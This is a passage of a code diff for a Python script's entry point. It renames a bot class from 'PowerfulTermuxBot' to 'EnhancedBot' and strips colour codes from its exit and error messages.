+    print("="*60)
     
     try:
-        client = PowerfulTermuxBot()
+        client = EnhancedBot()
         client.run()
     except KeyboardInterrupt:
-        print("\n[\033[1;31m!\033[0m] Exiting...")
+        print("\n[!] Exiting...")
         sys.exit(0)
     except Exception as e:
-        print(f"\n[\033[1;31m!\033[0m] Fatal error: {e}")
+        print(f"\n[!] Fatal error: {e}")
         sys.exit(1)
-
-
